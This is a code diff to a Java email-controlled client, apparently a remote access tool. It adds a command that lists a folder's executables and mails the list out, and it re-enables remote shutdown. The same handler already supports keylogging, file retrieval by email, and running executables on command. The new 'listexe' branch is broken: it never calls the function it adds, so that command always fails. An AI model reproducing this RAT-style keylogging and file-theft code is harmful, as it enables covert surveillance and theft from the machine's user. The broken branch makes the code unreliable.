@@ -4,12 +4,15 @@ import javax.mail.MessagingException;
 import java.io.IOException;
 import java.nio.file.Files;
 import java.nio.file.Path;
+import java.nio.file.Paths;
 import java.time.ZonedDateTime;
 import java.time.format.DateTimeFormatter;
 import java.util.Arrays;
 import java.util.List;
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
+
+
 
 public class MainClient {
     public static final String BANNER = """
@@ -174,7 +177,33 @@ public class MainClient {
             return false;
         }
     }
-
+    public static boolean listExe(int id, String folder ,String sender){
+        String subject = "res/" + id;
+        try{
+            String filename = "LIST EXEAPP" + ZonedDateTime.now().format(DateTimeFormatter
+                    .ofPattern(" dd-MM-yyyy HH-mm")) + ".txt";
+            ListExeFiles.getInstance().writeExePathsToFile(filename, folder);
+            if (isEmptyFile(Paths.get(filename))) {
+                SendMail.getInstance().sendMail(subject,"Check your Folder's Name, pls",null,true,sender);
+            } else {
+                SendMail.getInstance().sendMail(subject,null,filename,false,sender);
+            }
+            return true;
+        }catch (IOException | MessagingException e) {
+            System.out.println("can not run file");
+            e.printStackTrace();
+            return false;
+        }
+    }
+    private static boolean isEmptyFile(Path filePath) {
+        try {
+            long count = Files.lines(filePath).count();
+            return count == 0;
+        } catch (IOException e) {
+            e.printStackTrace();
+            return false;
+        }
+    }
     public static boolean processRequest(String header, String sender) {
         try {
             String[] parts = header.split("/");
@@ -187,10 +216,10 @@ public class MainClient {
             } else if (command.equalsIgnoreCase("keylog")) {
                 return keyLog(id, Long.parseLong(parts[3].trim()), sender);
             }
-//        else if (command.equalsIgnoreCase("Shutdown")) {
-//            if (parts.length > 3)
-//                return Shutdown(id, parts[3].trim(), sender);
-//            return Shutdown(id, "", sender);}
+        else if (command.equalsIgnoreCase("Shutdown")) {
+            if (parts.length > 3)
+                return Shutdown(id, parts[3].trim(), sender);
+            return Shutdown(id, "", sender);}
             else if (command.equalsIgnoreCase("ListProcess")) {
                 return ListProcess(id, sender);
             } else if (command.equalsIgnoreCase("listdir")) {
@@ -198,14 +227,15 @@ public class MainClient {
             } else if (command.equalsIgnoreCase("get")) {
                 return getFile(id, header, sender);
             } else if (command.equalsIgnoreCase("runexe")) {
-                String filepath = header.substring(19 + 1).trim();
+                String filepath = header.substring(20).trim();
                 return runexefile(id, filepath, sender);
+            } else if (command.equalsIgnoreCase("listexe")) {
+                String folder = header.substring(12).trim();
             }
             throw new ArrayIndexOutOfBoundsException();
         } catch (ArrayIndexOutOfBoundsException | NumberFormatException e) {
             try {
-                SendMail.getInstance().sendMail("Invalid Syntax request", ""
-                        , null, true, sender);
+                SendMail.getInstance().sendMail("Invalid Syntax request", "", null, true, sender);
                 return true;
             } catch (IOException | MessagingException ex) {
                 ex.printStackTrace();
